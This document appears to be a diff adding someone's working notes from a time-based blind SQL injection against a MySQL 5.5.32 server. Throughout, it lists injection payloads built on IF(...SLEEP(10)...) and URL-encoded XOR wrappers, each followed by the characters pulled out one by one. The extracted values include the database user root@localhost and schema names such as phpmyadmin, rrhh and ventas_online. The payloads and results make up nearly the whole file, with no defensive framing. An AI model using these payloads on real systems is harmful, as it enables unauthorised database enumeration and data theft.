@@ -1,0 +1,138 @@
+BDSM=  MySQL 5.5.32
+///////////////////////////////////////////
+IF(substr(USER(),1,1)='a', SLEEP(10), NULL)
+///////////////////////////////////////////
+1.- r
+2.- o
+3.- o
+4.- t
+5.- @
+6.- l
+7.- o
+8.- c
+9.- a
+10.-l
+11.-h
+12.-o
+13.-s
+14.-t
+///////////////////////////////////////////
+IF(LENGTH((SELECT%20CAST((SELECT%20DISTINCT%20schema_name%20FROM%20information_schema.schemata%20LIMIT%200%2C1)%20AS%20CHAR)))%20%3E%2015%2C%20SLEEP(10)%2C%20NULL)
+///////////////////////////////////////////0
+1.-i
+2.-n
+3.-f
+4.-o
+5.-r
+6.-m
+7.-a
+8.-t
+9.-i
+10.-o
+11.-n
+12.-_
+13.-s
+14.-c
+15.-h
+16.-e
+17.-m
+18.-a
+///////////////////////////////////////////
+IF(substr((SELECT DISTINCT schema_name FROM information_schema.schemata LIMIT 0,1),1,1) = 'a', SLEEP(10), NULL)
+///////////////////////////////////////////
+'XOR%20IF(substr((SELECT%20DISTINCT%20schema_name%20FROM%20information_schema.schemata%20LIMIT%200%2C1)%2C7%2C1)%20%3D%20%27a%27%2C%20SLEEP(10)%2C%20NULL)%20OR'
+///////////////////////////////////////////
+IF(LENGTH((SELECT CAST((SELECT DISTINCT schema_name FROM information_schema.schemata LIMIT 1,1) AS CHAR))) > 15, SLEEP(10), NULL)
+///////////////////////////////////////////
+'XOR%20IF(LENGTH((SELECT%20CAST((SELECT%20DISTINCT%20schema_name%20FROM%20information_schema.schemata%20LIMIT%201%2C1)%20AS%20CHAR)))%20%3D%209%2C%20SLEEP(10)%2C%20NULL)%20OR'
+///////////////////////////////////////////
+IF(substr((SELECT DISTINCT schema_name FROM information_schema.schemata LIMIT 1,1),1,1) = 'a', SLEEP(10), NULL)
+///////////////////////////////////////////1
+1.-g
+2.-o
+3.-b
+4.-a
+5.-r
+6.-i
+7.-n
+8.-a
+9.-s
+///////////////////////////////////////////
+IF(LENGTH((SELECT%20CAST((SELECT%20DISTINCT%20schema_name%20FROM%20information_schema.schemata%20LIMIT%202%2C1)%20AS%20CHAR)))%20%3D%205%2C%20SLEEP(10)%2C%20NULL)
+///////////////////////////////////////////
+///////////////////////////////////////////2
+1.-m
+2.-y
+3.-s
+4.-q
+5.-l
+///////////////////////////////////////////
+IF(LENGTH((SELECT%20CAST((SELECT%20DISTINCT%20schema_name%20FROM%20information_schema.schemata%20LIMIT%203%2C1)%20AS%20CHAR)))%20%3D%2018%2C%20SLEEP(10)%2C%20NULL)
+///////////////////////////////////////////
+///////////////////////////////////////////3
+1.-p
+2.-e
+3.-r
+4.-f
+5.-o
+6.-r
+7.-m
+8.-a
+9.-n
+10.-c
+11.-e
+12.-_
+13.-s
+14.-c
+15.-h
+16.-e
+17.-m
+18.-a
+///////////////////////////////////////////
+///////////////////////////////////////////4
+'XOR%20IF(LENGTH((SELECT%20CAST((SELECT%20DISTINCT%20schema_name%20FROM%20information_schema.schemata%20LIMIT%204%2C1)%20AS%20CHAR)))%20%3D%2010%2C%20SLEEP(10)%2C%20NULL)%20OR'
+///////////////////////////////////////////
+1.-p
+2.-h
+3.-p
+4.-m
+5.-y
+6.-a
+7.-d
+8.-m
+9.-i
+10.-n
+///////////////////////////////////////////5
+'XOR%20IF(LENGTH((SELECT%20CAST((SELECT%20DISTINCT%20schema_name%20FROM%20information_schema.schemata%20LIMIT%205%2C1)%20AS%20CHAR)))%20%3D%204%2C%20SLEEP(10)%2C%20NULL)%20OR'
+///////////////////////////////////////////
+///////////////////////////////////////////
+1.-r
+2.-r
+3.-h
+4.-h
+///////////////////////////////////////////6
+XOR%20IF(LENGTH((SELECT CAST((SELECT DISTINCT schema_name FROM information_schema.schemata LIMIT 6,1) AS CHAR))) = 4, SLEEP(10), NULL)%20OR
+///////////////////////////////////////////6
+1.-t
+2.-e
+3.-s
+4.-t
+///////////////////////////////////////////
+'XOR%20IF(LENGTH((SELECT CAST((SELECT DISTINCT schema_name FROM information_schema.schemata LIMIT 7,1) AS CHAR))) = 13, SLEEP(10), NULL)%20OR'
+///////////////////////////////////////////
+1.- v
+2.- e
+3.- n
+4.- t
+5.- a
+6.- s
+7.- _
+8.- o
+9.- n
+10.-l
+11.-i
+12.-n
+13.-e
+///////////////////////////////////////////7
+
+///////////////////////////////////////////8
